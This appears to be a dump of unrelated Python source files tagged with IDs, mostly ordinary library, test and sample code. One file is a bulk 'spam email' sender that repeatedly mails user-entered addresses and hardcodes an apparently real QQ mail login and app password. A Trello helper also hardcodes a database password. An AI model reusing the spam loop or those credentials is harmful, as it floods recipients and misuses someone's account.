        tm.assert_class_equal(result.index, ser.index, obj=""series index"")


def test_tseries_indices_frame(setup_path):

    with ensure_clean_store(setup_path) as store:
        idx = tm.makeDateIndex(10)
        df = DataFrame(np.random.randn(len(idx), 3), index=idx)
        store[""a""] = df
        result = store[""a""]

        tm.assert_frame_equal(result, df)
        assert result.index.freq == df.index.freq
        tm.assert_class_equal(result.index, df.index, obj=""dataframe index"")

        idx = tm.makePeriodIndex(10)
        df = DataFrame(np.random.randn(len(idx), 3), idx)
        store[""a""] = df
        result = store[""a""]

        tm.assert_frame_equal(result, df)
        assert result.index.freq == df.index.freq
        tm.assert_class_equal(result.index, df.index, obj=""dataframe index"")"
JY411	JY411-_font.py	"import _plotly_utils.basevalidators


class FontValidator(_plotly_utils.basevalidators.CompoundValidator):
    def __init__(self, plotly_name=""font"", parent_name=""box.hoverlabel"", **kwargs):
        super(FontValidator, self).__init__(
            plotly_name=plotly_name,
            parent_name=parent_name,
            data_class_str=kwargs.pop(""data_class_str"", ""Font""),
            data_docs=kwargs.pop(
                ""data_docs"",
                """"""
            color

            colorsrc
                Sets the source reference on Chart Studio Cloud
                for `color`.
            family
                HTML font family - the typeface that will be
                applied by the web browser. The web browser
                will only be able to apply a font if it is
                available on the system which it operates.
                Provide multiple font families, separated by
                commas, to indicate the preference in which to
                apply fonts if they aren't available on the
                system. The Chart Studio Cloud (at
                https://chart-studio.plotly.com or on-premise)
                generates images on a server, where only a
                select number of fonts are installed and
                supported. These include ""Arial"", ""Balto"",
                ""Courier New"", ""Droid Sans"",, ""Droid Serif"",
                ""Droid Sans Mono"", ""Gravitas One"", ""Old
                Standard TT"", ""Open Sans"", ""Overpass"", ""PT Sans
                Narrow"", ""Raleway"", ""Times New Roman"".
            familysrc
                Sets the source reference on Chart Studio Cloud
                for `family`.
            size

            sizesrc
                Sets the source reference on Chart Studio Cloud
                for `size`.
"""""",
            ),
            **kwargs,
        )"
JY184	JY184-RegRestoreKey.py	"import win32api, win32security
import win32con, ntsecuritycon, winnt
import os

temp_dir = win32api.GetTempPath()
fname = win32api.GetTempFileName(temp_dir, ""rsk"")[0]
print(fname)
## file can't exist
os.remove(fname)

## enable backup and restore privs
required_privs = (
    (
        win32security.LookupPrivilegeValue("""", ntsecuritycon.SE_BACKUP_NAME),
        win32con.SE_PRIVILEGE_ENABLED,
    ),
    (
        win32security.LookupPrivilegeValue("""", ntsecuritycon.SE_RESTORE_NAME),
        win32con.SE_PRIVILEGE_ENABLED,
    ),
)
ph = win32api.GetCurrentProcess()
th = win32security.OpenProcessToken(
    ph, win32con.TOKEN_READ | win32con.TOKEN_ADJUST_PRIVILEGES
)
adjusted_privs = win32security.AdjustTokenPrivileges(th, 0, required_privs)

try:
    sa = win32security.SECURITY_ATTRIBUTES()
    my_sid = win32security.GetTokenInformation(th, ntsecuritycon.TokenUser)[0]
    sa.SECURITY_DESCRIPTOR.SetSecurityDescriptorOwner(my_sid, 0)

    k, disp = win32api.RegCreateKeyEx(
        win32con.HKEY_CURRENT_USER,
        ""Python test key"",
        SecurityAttributes=sa,
        samDesired=win32con.KEY_ALL_ACCESS,
        Class=""some class"",
        Options=0,
    )
    win32api.RegSetValue(k, None, win32con.REG_SZ, ""Default value for python test key"")

    subk, disp = win32api.RegCreateKeyEx(
        k,
        ""python test subkey"",
        SecurityAttributes=sa,
        samDesired=win32con.KEY_ALL_ACCESS,
        Class=""some other class"",
        Options=0,
    )
    win32api.RegSetValue(subk, None, win32con.REG_SZ, ""Default value for subkey"")

    win32api.RegSaveKeyEx(
        k, fname, Flags=winnt.REG_STANDARD_FORMAT, SecurityAttributes=sa
    )

    restored_key, disp = win32api.RegCreateKeyEx(
        win32con.HKEY_CURRENT_USER,
        ""Python test key(restored)"",
        SecurityAttributes=sa,
        samDesired=win32con.KEY_ALL_ACCESS,
        Class=""restored class"",
        Options=0,
    )
    win32api.RegRestoreKey(restored_key, fname)
finally:
    win32security.AdjustTokenPrivileges(th, 0, adjusted_privs)"
JD405	JD405-cache_adapter.py	"from abc import ABCMeta, abstractmethod


class CacheAdapter:
    """"""
    CacheAdapter Abstract Base Class
    """"""
    __metaclass__ = ABCMeta

    @abstractmethod
    def get(self, public_id, type, resource_type, transformation, format):
        """"""
        Gets value specified by parameters

        :param public_id:       The public ID of the resource
        :param type:            The storage type
        :param resource_type:   The type of the resource
        :param transformation:  The transformation string
        :param format:          The format of the resource

        :return: None|mixed value, None if not found
        """"""
        raise NotImplementedError

    @abstractmethod
    def set(self, public_id, type, resource_type, transformation, format, value):
        """"""
        Sets value specified by parameters

        :param public_id:       The public ID of the resource
        :param type:            The storage type
        :param resource_type:   The type of the resource
        :param transformation:  The transformation string
        :param format:          The format of the resource
        :param value:           The value to set

        :return: bool True on success or False on failure
        """"""
        raise NotImplementedError

    @abstractmethod
    def delete(self, public_id, type, resource_type, transformation, format):
        """"""
        Deletes entry specified by parameters

        :param public_id:       The public ID of the resource
        :param type:            The storage type
        :param resource_type:   The type of the resource
        :param transformation:  The transformation string
        :param format:          The format of the resource

        :return: bool True on success or False on failure
        """"""
        raise NotImplementedError

    @abstractmethod
    def flush_all(self):
        """"""
        Flushes all entries from cache

        :return: bool True on success or False on failure
        """"""
        raise NotImplementedError"
JD446	JD446-main.py	"# Copyright 2022 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

# [START gae_deferred_handler_flask]
import os

from flask import Flask, request
from google.appengine.api import wrap_wsgi_app
from google.appengine.ext import deferred
from google.appengine.ext import ndb

my_key = os.environ.get(""GAE_VERSION"", ""Missing"")

app = Flask(__name__)
app.wsgi_app = wrap_wsgi_app(app.wsgi_app, use_deferred=True)


class Counter(ndb.Model):
    count = ndb.IntegerProperty(indexed=False)


def do_something_later(key, amount):
    entity = Counter.get_or_insert(key, count=0)
    entity.count += amount
    entity.put()


@app.route(""/counter/increment"")
def increment_counter():
    # Use default URL and queue name, no task name, execute ASAP.
    deferred.defer(do_something_later, my_key, 10)

    # Use default URL and queue name, no task name, execute after 10s.
    deferred.defer(do_something_later, my_key, 10, _countdown=20)

    # Providing non-default task queue arguments
    deferred.defer(do_something_later, my_key, 10, _url=""/custom/path"", _countdown=40)

    return ""Deferred counter increment.""


@app.route(""/counter/get"")
def view_counter():
    counter = Counter.get_or_insert(my_key, count=0)
    return str(counter.count)


@app.route(""/custom/path"", methods=[""POST""])
def custom_deferred():
    print(""Executing deferred task."")
    # request.environ contains the WSGI `environ` dictionary (See PEP 0333)
    return deferred.Handler().post(request.environ)


# [END gae_deferred_handler_flask]"
JD185	JD185-user.py	"#!/usr/bin/env python3
""""""User module.
""""""
import hashlib
from models.base import Base


class User(Base):
    """"""User class.
    """"""

    def __init__(self, *args: list, **kwargs: dict):
        """"""Initialize a User instance.
        """"""
        super().__init__(*args, **kwargs)
        self.email = kwargs.get('email')
        self._password = kwargs.get('_password')
        self.first_name = kwargs.get('first_name')
        self.last_name = kwargs.get('last_name')

    @property
    def password(self) -> str:
        """"""Getter of the password.
        """"""
        return self._password

    @password.setter
    def password(self, pwd: str):
        """"""Setter of a new password: encrypt in SHA256.

        WARNING: Use a better password hashing algorithm like argon2
        or bcrypt in real-world projects.
        """"""
        if pwd is None or type(pwd) is not str:
            self._password = None
        else:
            self._password = hashlib.sha256(pwd.encode()).hexdigest().lower()

    def is_valid_password(self, pwd: str) -> bool:
        """"""Validate a password.
        """"""
        if pwd is None or type(pwd) is not str:
            return False
        if self.password is None:
            return False
        pwd_e = pwd.encode()
        return hashlib.sha256(pwd_e).hexdigest().lower() == self.password

    def display_name(self) -> str:
        """"""Display User name based on email/first_name/last_name.
        """"""
        if self.email is None and self.first_name is None \
                and self.last_name is None:
            return """"
        if self.first_name is None and self.last_name is None:
            return ""{}"".format(self.email)
        if self.last_name is None:
            return ""{}"".format(self.first_name)
        if self.first_name is None:
            return ""{}"".format(self.last_name)
        else:
            return ""{} {}"".format(self.first_name, self.last_name)"
JY317	JY317-iterator.py	"__all__ = ['Iterator']


import copy
import functools as f
import operator as op
import typing as t

from ..function import deprecated_classmethod

if t.TYPE_CHECKING:
    import typing_extensions as te


class Iterator:
    '''Iterator (map, filter, reduce)

    Example:
        >>> i1 = Iterator.fromList([-2, -1, 0, 1, 2])
        >>> i2 = i1.filter(bool).map(lambda x: (x, x+1))
        >>> print(i2.copy().collect_as_dict())
        {-2: -1, -1: 0, 1: 2, 2: 3}
        >>> i3 = i2.map(lambda x: x[0]*x[1])
        >>> print(i3.copy().reduce_with_operator('add'))
        10
    '''

    def __init__(self, iterator: t.Iterator) -> None:
        self._iterator = iterator

    def __iter__(self) -> t.Iterator:
        return self._iterator

    @classmethod
    def fromDict(cls, iterable: t.Dict) -> 'te.Self':
        return cls(iter(iterable.items()))

    @classmethod
    def fromIter(cls, iterable: t.Iterable) -> 'te.Self':
        return cls(iter(iterable))

    @classmethod
    def fromList(cls, iterable: t.List) -> 'te.Self':
        return cls(iter(iterable))

    def collect(self, func: t.Callable) -> t.Any:
        return func(func(self._iterator))

    def collect_as_dict(self) -> t.Dict:
        return self.collect(dict)

    def collect_as_list(self) -> t.List:
        return self.collect(list)

    def copy(self) -> 'te.Self':
        return copy.deepcopy(self)

    def filter(self, func: t.Optional[t.Callable] = None) -> 'te.Self':
        return self._new(filter(func, self._iterator))

    def map(self, func: t.Callable) -> 'te.Self':
        return self._new(map(func, self._iterator))

    def reduce(self, func: t.Callable) -> t.Any:
        return f.reduce(func, self._iterator)

    def reduce_with_operator(self, attr: str) -> t.Any:
        return self.reduce(getattr(op, attr))

    def _new(self, iterator: t.Iterator) -> 'te.Self':
        return self.__class__(iterator)

    from_dict = deprecated_classmethod(fromDict)
    from_iter = deprecated_classmethod(fromIter)
    from_list = deprecated_classmethod(fromList)"
JD60	JD60-isatty_test.py	"# Copyright Jonathan Hartley 2013. BSD 3-Clause license, see LICENSE file.
import sys
from unittest import TestCase, main

from ..ansitowin32 import StreamWrapper, AnsiToWin32
from .utils import pycharm, replace_by, replace_original_by, StreamTTY, StreamNonTTY


def is_a_tty(stream):
    return StreamWrapper(stream, None).isatty()

class IsattyTest(TestCase):

    def test_TTY(self):
        tty = StreamTTY()
        self.assertTrue(is_a_tty(tty))
        with pycharm():
            self.assertTrue(is_a_tty(tty))

    def test_nonTTY(self):
        non_tty = StreamNonTTY()
        self.assertFalse(is_a_tty(non_tty))
        with pycharm():
            self.assertFalse(is_a_tty(non_tty))

    def test_withPycharm(self):
        with pycharm():
            self.assertTrue(is_a_tty(sys.stderr))
            self.assertTrue(is_a_tty(sys.stdout))

    def test_withPycharmTTYOverride(self):
        tty = StreamTTY()
        with pycharm(), replace_by(tty):
            self.assertTrue(is_a_tty(tty))

    def test_withPycharmNonTTYOverride(self):
        non_tty = StreamNonTTY()
        with pycharm(), replace_by(non_tty):
            self.assertFalse(is_a_tty(non_tty))

    def test_withPycharmNoneOverride(self):
        with pycharm():
            with replace_by(None), replace_original_by(None):
                self.assertFalse(is_a_tty(None))
                self.assertFalse(is_a_tty(StreamNonTTY()))
                self.assertTrue(is_a_tty(StreamTTY()))

    def test_withPycharmStreamWrapped(self):
        with pycharm():
            self.assertTrue(AnsiToWin32(StreamTTY()).stream.isatty())
            self.assertFalse(AnsiToWin32(StreamNonTTY()).stream.isatty())
            self.assertTrue(AnsiToWin32(sys.stdout).stream.isatty())
            self.assertTrue(AnsiToWin32(sys.stderr).stream.isatty())


if __name__ == '__main__':
    main()"
JD147	JD147-__init__.py	"# SPDX-License-Identifier: MIT

import sys
import warnings

from functools import partial

from . import converters, exceptions, filters, setters, validators
from ._cmp import cmp_using
from ._config import get_run_validators, set_run_validators
from ._funcs import asdict, assoc, astuple, evolve, has, resolve_types
from ._make import (
    NOTHING,
    Attribute,
    Factory,
    attrib,
    attrs,
    fields,
    fields_dict,
    make_class,
    validate,
)
from ._next_gen import define, field, frozen, mutable
from ._version_info import VersionInfo


if sys.version_info < (3, 7):  # pragma: no cover
    warnings.warn(
        ""Running attrs on Python 3.6 is deprecated & we intend to drop ""
        ""support soon. If that's a problem for you, please let us know why & ""
        ""we MAY re-evaluate: <https://github.com/python-attrs/attrs/pull/993>"",
        DeprecationWarning,
    )

__version__ = ""22.2.0""
__version_info__ = VersionInfo._from_version_string(__version__)

__title__ = ""attrs""
__description__ = ""Classes Without Boilerplate""
__url__ = ""https://www.attrs.org/""
__uri__ = __url__
__doc__ = __description__ + "" <"" + __uri__ + "">""

__author__ = ""Hynek Schlawack""
__email__ = ""hs@ox.cx""

__license__ = ""MIT""
__copyright__ = ""Copyright (c) 2015 Hynek Schlawack""


s = attributes = attrs
ib = attr = attrib
dataclass = partial(attrs, auto_attribs=True)  # happy Easter ;)


class AttrsInstance:
    pass


__all__ = [
    ""Attribute"",
    ""AttrsInstance"",
    ""Factory"",
    ""NOTHING"",
    ""asdict"",
    ""assoc"",
    ""astuple"",
    ""attr"",
    ""attrib"",
    ""attributes"",
    ""attrs"",
    ""cmp_using"",
    ""converters"",
    ""define"",
    ""evolve"",
    ""exceptions"",
    ""field"",
    ""fields"",
    ""fields_dict"",
    ""filters"",
    ""frozen"",
    ""get_run_validators"",
    ""has"",
    ""ib"",
    ""make_class"",
    ""mutable"",
    ""resolve_types"",
    ""s"",
    ""set_run_validators"",
    ""setters"",
    ""validate"",
    ""validators"",
]"
JY33	JY33-ascend_retinanet_r50_fpn.py	"# model settings
model = dict(
    type='RetinaNet',
    backbone=dict(
        type='ResNet',
        depth=50,
        num_stages=4,
        out_indices=(0, 1, 2, 3),
        frozen_stages=1,
        norm_cfg=dict(type='BN', requires_grad=True),
        norm_eval=True,
        style='pytorch',
        init_cfg=dict(type='Pretrained', checkpoint='torchvision://resnet50')),
    neck=dict(
        type='FPN',
        in_channels=[256, 512, 1024, 2048],
        out_channels=256,
        start_level=1,
        add_extra_convs='on_input',
        num_outs=5),
    bbox_head=dict(
        type='AscendRetinaHead',
        num_classes=80,
        in_channels=256,
        stacked_convs=4,
        feat_channels=256,
        anchor_generator=dict(
            type='AnchorGenerator',
            octave_base_scale=4,
            scales_per_octave=3,
            ratios=[0.5, 1.0, 2.0],
            strides=[8, 16, 32, 64, 128]),
        bbox_coder=dict(
            type='DeltaXYWHBBoxCoder',
            target_means=[.0, .0, .0, .0],
            target_stds=[1.0, 1.0, 1.0, 1.0]),
        loss_cls=dict(
            type='FocalLoss',
            use_sigmoid=True,
            gamma=2.0,
            alpha=0.25,
            loss_weight=1.0),
        loss_bbox=dict(type='L1Loss', loss_weight=1.0)),
    # model training and testing settings
    train_cfg=dict(
        assigner=dict(
            type='AscendMaxIoUAssigner',
            pos_iou_thr=0.5,
            neg_iou_thr=0.4,
            min_pos_iou=0,
            ignore_iof_thr=-1),
        allowed_border=-1,
        pos_weight=-1,
        debug=False),
    test_cfg=dict(
        nms_pre=1000,
        min_bbox_size=0,
        score_thr=0.05,
        nms=dict(type='nms', iou_threshold=0.5),
        max_per_img=100))"
JY507	JY507-__init__.py	"from esphome.components import fan
import esphome.config_validation as cv
import esphome.codegen as cg
from esphome.const import CONF_OUTPUT_ID, CONF_SPEED_COUNT, CONF_SWITCH_DATAPOINT
from .. import tuya_ns, CONF_TUYA_ID, Tuya

DEPENDENCIES = [""tuya""]

CONF_SPEED_DATAPOINT = ""speed_datapoint""
CONF_OSCILLATION_DATAPOINT = ""oscillation_datapoint""
CONF_DIRECTION_DATAPOINT = ""direction_datapoint""

TuyaFan = tuya_ns.class_(""TuyaFan"", cg.Component, fan.Fan)

CONFIG_SCHEMA = cv.All(
    fan.FAN_SCHEMA.extend(
        {
            cv.GenerateID(CONF_OUTPUT_ID): cv.declare_id(TuyaFan),
            cv.GenerateID(CONF_TUYA_ID): cv.use_id(Tuya),
            cv.Optional(CONF_OSCILLATION_DATAPOINT): cv.uint8_t,
            cv.Optional(CONF_SPEED_DATAPOINT): cv.uint8_t,
            cv.Optional(CONF_SWITCH_DATAPOINT): cv.uint8_t,
            cv.Optional(CONF_DIRECTION_DATAPOINT): cv.uint8_t,
            cv.Optional(CONF_SPEED_COUNT, default=3): cv.int_range(min=1, max=256),
        }
    ).extend(cv.COMPONENT_SCHEMA),
    cv.has_at_least_one_key(CONF_SPEED_DATAPOINT, CONF_SWITCH_DATAPOINT),
)


async def to_code(config):
    parent = await cg.get_variable(config[CONF_TUYA_ID])

    var = cg.new_Pvariable(config[CONF_OUTPUT_ID], parent, config[CONF_SPEED_COUNT])
    await cg.register_component(var, config)
    await fan.register_fan(var, config)

    if CONF_SPEED_DATAPOINT in config:
        cg.add(var.set_speed_id(config[CONF_SPEED_DATAPOINT]))
    if CONF_SWITCH_DATAPOINT in config:
        cg.add(var.set_switch_id(config[CONF_SWITCH_DATAPOINT]))
    if CONF_OSCILLATION_DATAPOINT in config:
        cg.add(var.set_oscillation_id(config[CONF_OSCILLATION_DATAPOINT]))
    if CONF_DIRECTION_DATAPOINT in config:
        cg.add(var.set_direction_id(config[CONF_DIRECTION_DATAPOINT]))"
JY122	JY122-3发送垃圾邮件.py	"from smtplib import SMTP_SSL
from email.mime.text import MIMEText
import time


def sendMail(message, Subject, sender_show, recipient_show, to_addrs, cc_show=''):
    # 填写真实的发邮件服务用户名
    user = '2354839133@qq.com'
    password = 'cdrrbztqusvuebjh'
    # 邮件内容
    msg = MIMEText(message, 'plain', _charset=""utf_8"")
    # 邮件主题描述
    msg[""Subject""] = Subject
    # 发件人显示，不起实际作用
    msg[""from""] = sender_show
    # 收件人显示，不起实际作用
    msg[""to""] = recipient_show
    # 抄送人显示，不起实际作用
    msg[""Cc""] = cc_show
    with SMTP_SSL(host=""smtp.qq.com"", port=465) as smtp:
        # 登陆发邮件服务器
        smtp.login(user=user, password=password)
        # 实际发送，接收邮件配置
        smtp.sendmail(from_addr=user, to_addrs=to_addrs.split(','), msg=msg.as_string())


if __name__ == '__main__':
    message = input(""输入邮件正文："")     # 邮件正文
    Subject = input(""输入邮件主题："")     # 邮件主题
    # 发件人名字
    sender_show = input(""输入发件人名字："")
    # 接收人名字
    recipient_show = input(""输入收件人名字："")
    # 实际发给的接收人
    email_list = []
    cs = int(input(""输入发送次数：""))
    sleeptime = int(input(""输入邮件发送时间间隔(秒)：""))
    b = 1
    while b == 1:
        a = input(""输入收件人邮箱："")
        email_list.append(a)
        b = int(input(""继续请按1，退出请按0:""))
        if b == 0:
            continue
    for i in email_list:
        to_addrs = i
        for a in range(1, cs + 1):
            time.sleep(sleeptime)
            sendMail(message, Subject, sender_show, recipient_show, to_addrs)
    print(""批量发送完成"")"
JD23	JD23-_pydev_sys_patch.py	"import sys


def patch_sys_module():

    def patched_exc_info(fun):

        def pydev_debugger_exc_info():
            type, value, traceback = fun()
            if type == ImportError:
                # we should not show frame added by plugin_import call
                if traceback and hasattr(traceback, ""tb_next""):
                    return type, value, traceback.tb_next
            return type, value, traceback

        return pydev_debugger_exc_info

    system_exc_info = sys.exc_info
    sys.exc_info = patched_exc_info(system_exc_info)
    if not hasattr(sys, ""system_exc_info""):
        sys.system_exc_info = system_exc_info


def patched_reload(orig_reload):

    def pydev_debugger_reload(module):
        orig_reload(module)
        if module.__name__ == ""sys"":
            # if sys module was reloaded we should patch it again
            patch_sys_module()

    return pydev_debugger_reload


def patch_reload():
    import builtins  # Py3

    if hasattr(builtins, ""reload""):
        sys.builtin_orig_reload = builtins.reload
        builtins.reload = patched_reload(sys.builtin_orig_reload)  # @UndefinedVariable
        try:
            import imp
            sys.imp_orig_reload = imp.reload
            imp.reload = patched_reload(sys.imp_orig_reload)  # @UndefinedVariable
        except:
            pass
    else:
        try:
            import importlib
            sys.importlib_orig_reload = importlib.reload  # @UndefinedVariable
            importlib.reload = patched_reload(sys.importlib_orig_reload)  # @UndefinedVariable
        except:
            pass

    del builtins


def cancel_patches_in_sys_module():
    sys.exc_info = sys.system_exc_info  # @UndefinedVariable
    import builtins  # Py3

    if hasattr(sys, ""builtin_orig_reload""):
        builtins.reload = sys.builtin_orig_reload

    if hasattr(sys, ""imp_orig_reload""):
        import imp
        imp.reload = sys.imp_orig_reload

    if hasattr(sys, ""importlib_orig_reload""):
        import importlib
        importlib.reload = sys.importlib_orig_reload

    del builtins"
JY66	JY66-http.py	"import http.server
import sys
from typing import Mapping, Tuple

from . import __version__
from .http_exceptions import HttpProcessingError as HttpProcessingError
from .http_parser import (
    HeadersParser as HeadersParser,
    HttpParser as HttpParser,
    HttpRequestParser as HttpRequestParser,
    HttpResponseParser as HttpResponseParser,
    RawRequestMessage as RawRequestMessage,
    RawResponseMessage as RawResponseMessage,
)
from .http_websocket import (
    WS_CLOSED_MESSAGE as WS_CLOSED_MESSAGE,
    WS_CLOSING_MESSAGE as WS_CLOSING_MESSAGE,
    WS_KEY as WS_KEY,
    WebSocketError as WebSocketError,
    WebSocketReader as WebSocketReader,
    WebSocketWriter as WebSocketWriter,
    WSCloseCode as WSCloseCode,
    WSMessage as WSMessage,
    WSMsgType as WSMsgType,
    ws_ext_gen as ws_ext_gen,
    ws_ext_parse as ws_ext_parse,
)
from .http_writer import (
    HttpVersion as HttpVersion,
    HttpVersion10 as HttpVersion10,
    HttpVersion11 as HttpVersion11,
    StreamWriter as StreamWriter,
)

__all__ = (
    ""HttpProcessingError"",
    ""RESPONSES"",
    ""SERVER_SOFTWARE"",
    # .http_writer
    ""StreamWriter"",
    ""HttpVersion"",
    ""HttpVersion10"",
    ""HttpVersion11"",
    # .http_parser
    ""HeadersParser"",
    ""HttpParser"",
    ""HttpRequestParser"",
    ""HttpResponseParser"",
    ""RawRequestMessage"",
    ""RawResponseMessage"",
    # .http_websocket
    ""WS_CLOSED_MESSAGE"",
    ""WS_CLOSING_MESSAGE"",
    ""WS_KEY"",
    ""WebSocketReader"",
    ""WebSocketWriter"",
    ""ws_ext_gen"",
    ""ws_ext_parse"",
    ""WSMessage"",
    ""WebSocketError"",
    ""WSMsgType"",
    ""WSCloseCode"",
)


SERVER_SOFTWARE: str = ""Python/{0[0]}.{0[1]} aiohttp/{1}"".format(
    sys.version_info, __version__
)

RESPONSES: Mapping[int, Tuple[str, str]] = http.server.BaseHTTPRequestHandler.responses"
JY263	JY263-_font.py	"import _plotly_utils.basevalidators


class FontValidator(_plotly_utils.basevalidators.CompoundValidator):
    def __init__(
        self, plotly_name=""font"", parent_name=""scatterternary.hoverlabel"", **kwargs
    ):
        super(FontValidator, self).__init__(
            plotly_name=plotly_name,
            parent_name=parent_name,
            data_class_str=kwargs.pop(""data_class_str"", ""Font""),
            data_docs=kwargs.pop(
                ""data_docs"",
                """"""
            color

            colorsrc
                Sets the source reference on Chart Studio Cloud
                for `color`.
            family
                HTML font family - the typeface that will be
                applied by the web browser. The web browser
                will only be able to apply a font if it is
                available on the system which it operates.
                Provide multiple font families, separated by
                commas, to indicate the preference in which to
                apply fonts if they aren't available on the
                system. The Chart Studio Cloud (at
                https://chart-studio.plotly.com or on-premise)
                generates images on a server, where only a
                select number of fonts are installed and
                supported. These include ""Arial"", ""Balto"",
                ""Courier New"", ""Droid Sans"",, ""Droid Serif"",
                ""Droid Sans Mono"", ""Gravitas One"", ""Old
                Standard TT"", ""Open Sans"", ""Overpass"", ""PT Sans
                Narrow"", ""Raleway"", ""Times New Roman"".
            familysrc
                Sets the source reference on Chart Studio Cloud
                for `family`.
            size

            sizesrc
                Sets the source reference on Chart Studio Cloud
                for `size`.
"""""",
            ),
            **kwargs,
        )"
JD464	JD464-indexpool.py	"# Copyright 2017-present Open Networking Foundation
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
# http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
from bitstring import BitArray
import structlog

log = structlog.get_logger()

class IndexPool(object):
    def __init__(self, max_entries, offset):
        self.max_entries = max_entries
        self.offset = offset
        self.indices = BitArray(self.max_entries)

    def get_next(self):
        try:
            _pos = self.indices.find('0b0')
            self.indices.set(1, _pos)
            return self.offset + _pos[0]
        except IndexError:
            log.info(""exception-fail-to-allocate-id-all-bits-in-use"")
            return None

    def allocate(self, index):
        try:
            _pos = index - self.offset
            if not (0 <= _pos < self.max_entries):
                log.info(""{}-out-of-range"".format(index))
                return None
            if self.indices[_pos]:
                log.info(""{}-is-already-allocated"".format(index))
                return None
            self.indices.set(1, _pos)
            return index

        except IndexError:
            return None

    def release(self, index):
        index -= self.offset
        _pos = (index,)
        try:
            self.indices.set(0, _pos)
        except IndexError:
            log.info(""bit-position-{}-out-of-range"".format(index))

    #index or multiple indices to set all of them to 1 - need to be a tuple
    def pre_allocate(self, index):
        if(isinstance(index, tuple)):
            _lst = list(index)
            for i in range(len(_lst)):
                _lst[i] -= self.offset
            index = tuple(_lst)
            self.indices.set(1, index)"
JD373	JD373-_g_a_s_p.py	"from fontTools.misc.textTools import safeEval
from . import DefaultTable
import struct


GASP_SYMMETRIC_GRIDFIT = 0x0004
GASP_SYMMETRIC_SMOOTHING = 0x0008
GASP_DOGRAY = 0x0002
GASP_GRIDFIT = 0x0001


class table__g_a_s_p(DefaultTable.DefaultTable):
    def decompile(self, data, ttFont):
        self.version, numRanges = struct.unpack("">HH"", data[:4])
        assert 0 <= self.version <= 1, ""unknown 'gasp' format: %s"" % self.version
        data = data[4:]
        self.gaspRange = {}
        for i in range(numRanges):
            rangeMaxPPEM, rangeGaspBehavior = struct.unpack("">HH"", data[:4])
            self.gaspRange[int(rangeMaxPPEM)] = int(rangeGaspBehavior)
            data = data[4:]
        assert not data, ""too much data""

    def compile(self, ttFont):
        version = 0  # ignore self.version
        numRanges = len(self.gaspRange)
        data = b""""
        items = sorted(self.gaspRange.items())
        for rangeMaxPPEM, rangeGaspBehavior in items:
            data = data + struct.pack("">HH"", rangeMaxPPEM, rangeGaspBehavior)
            if rangeGaspBehavior & ~(GASP_GRIDFIT | GASP_DOGRAY):
                version = 1
        data = struct.pack("">HH"", version, numRanges) + data
        return data

    def toXML(self, writer, ttFont):
        items = sorted(self.gaspRange.items())
        for rangeMaxPPEM, rangeGaspBehavior in items:
            writer.simpletag(
                ""gaspRange"",
                [
                    (""rangeMaxPPEM"", rangeMaxPPEM),
                    (""rangeGaspBehavior"", rangeGaspBehavior),
                ],
            )
            writer.newline()

    def fromXML(self, name, attrs, content, ttFont):
        if name != ""gaspRange"":
            return
        if not hasattr(self, ""gaspRange""):
            self.gaspRange = {}
        self.gaspRange[safeEval(attrs[""rangeMaxPPEM""])] = safeEval(
            attrs[""rangeGaspBehavior""]
        )"
JY526	JY526-utils.py	"import csv
import os
import psycopg2
from psycopg2.extras import RealDictCursor


def write_chat_to_csv(file_path, message):
    header = [""chat_id"", ""first_name"", ""last_name"", ""trello_username""]
    row = {
        ""chat_id"": message.chat.id,
        ""first_name"": message.from_user.first_name,
        ""last_name"": message.from_user.last_name,
        ""trello_username"": message.text
    }

    with open(file_path, ""a"", newline=""\n"", encoding='utf8') as f:
        csv_writer = csv.DictWriter(f, header)
        if os.path.getsize(file_path) == 0:
            csv_writer.writeheader()
        print(row)
        csv_writer.writerow(row)
    print(""Chat add successfully."")


def write_databse_trello( fullname ,chat_id , phone):
    connection = psycopg2.connect(
        dbname='trello',
        user='postgres',
        password='12345',
        host='localhost',
        port=5432
    )
    cur = connection.cursor(cursor_factory=RealDictCursor)
    sql = ""insert into registration(full_name , chatid ,phone) values (%s, %s, %s)""
    cur.execute(sql, (fullname ,chat_id ,phone))
    connection.commit()


def check_chat_id_from_csv(file_path, chat_id):
    with open(file_path, encoding=""utf-8"") as f:
        csv_reader = csv.DictReader(f)
        return chat_id in [int(row.get(""chat_id"")) for row in csv_reader]


def get_trello_username_by_chat_id(file_path, chat_id):
    with open(file_path, encoding=""utf-8"") as f:
        csv_reader = csv.DictReader(f)
        users = [
            row.get(""trello_username"")
            for row in csv_reader
            if int(row.get(""chat_id"")) == chat_id
        ]
        return users[0] if users else None


def get_member_tasks_message(card_data, member_id):
    msg = """"
    for data in card_data:
        if member_id in data.get(""idMembers""):
            msg += f""{data.get('idShort')} - <a href=\""{data.get('url')}\"">{data.get('name')}</a>\n""

    return msg"
JD169	JD169-email.py	"import re

from .utils import validator

user_regex = re.compile(
    # dot-atom
    r""(^[-!#$%&'*+/=?^_`{}|~0-9A-Z]+""
    r""(\.[-!#$%&'*+/=?^_`{}|~0-9A-Z]+)*$""
    # quoted-string
    r'|^""([\001-\010\013\014\016-\037!#-\[\]-\177]|'
    r""""""\\[\001-\011\013\014\016-\177])*""$)"""""",
    re.IGNORECASE
)
domain_regex = re.compile(
    # domain
    r'(?:[A-Z0-9](?:[A-Z0-9-]{0,61}[A-Z0-9])?\.)+'
    r'(?:[A-Z]{2,6}\.?|[A-Z0-9-]{2,}\.?$)'
    # literal form, ipv4 address (SMTP 4.1.3)
    r'|^\[(25[0-5]|2[0-4]\d|[0-1]?\d?\d)'
    r'(\.(25[0-5]|2[0-4]\d|[0-1]?\d?\d)){3}\]$',
    re.IGNORECASE)
domain_whitelist = ['localhost']


@validator
def email(value, whitelist=None):
    """"""
    Validate an email address.

    This validator is based on `Django's email validator`_. Returns
    ``True`` on success and :class:`~validators.utils.ValidationFailure`
    when validation fails.

    Examples::

        >>> email('someone@example.com')
        True

        >>> email('bogus@@')
